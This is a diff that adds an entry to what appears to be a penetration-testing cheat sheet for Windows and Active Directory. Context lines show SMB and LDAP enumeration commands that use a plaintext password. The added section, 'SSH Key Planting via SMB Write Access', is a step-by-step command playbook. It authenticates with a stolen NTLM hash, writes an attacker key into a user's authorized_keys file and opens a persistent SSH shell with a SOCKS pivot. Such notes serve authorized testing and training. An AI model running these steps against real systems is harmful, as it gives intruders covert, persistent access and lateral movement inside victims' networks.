@@ -515,3 +515,24 @@ smbmap -u forend -p Klmcargo2 -d DOMAIN.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
   adidnsdump -u DOMAIN\\forend ldap://172.16.5.5
   adidnsdump -u DOMAIN\\forend ldap://172.16.5.5 -r  # resolve unknown records via A query
   ```
+
+### SSH Key Planting via SMB Write Access [added: 2026-04]
+- **Tags:** #LateralMovement #SSHKey #SMBWrite #AuthorizedKeys #WindowsSSH #PersistentAccess #OpenSSH
+- **Trigger:** Windows target has SSH (port 22) open AND you have SMB write/read access to a user's home directory share
+- **Prereq:** SMB write access to target user's home directory; SSH enabled on target (common on modern Windows Server); NTLM hash or password of user
+- **Yields:** Persistent SSH shell as target user; optionally SOCKS tunnel for proxychains
+- **Opsec:** Low (no malware dropped; uses native SSH)
+- **Context:** Windows Server 2019+ ships with OpenSSH. If a `users` share exposes home directories and you have write access, plant your public key for a clean persistent shell.
+- **Payload/Method:**
+  ```bash
+  # 1. Generate key pair
+  ssh-keygen -t ed25519 -f id_attack
+  mv id_attack.pub authorized_keys
+
+  # 2. Plant via SMB (using hash or password)
+  impacket-smbclient user@domain -hashes :NTHASH
+  # use users; cd username; mkdir .ssh; cd .ssh; put authorized_keys
+
+  # 3. SSH in (add -D for SOCKS proxy if internal services need proxychains)
+  ssh -i id_attack -D 1080 username@target
+  ```
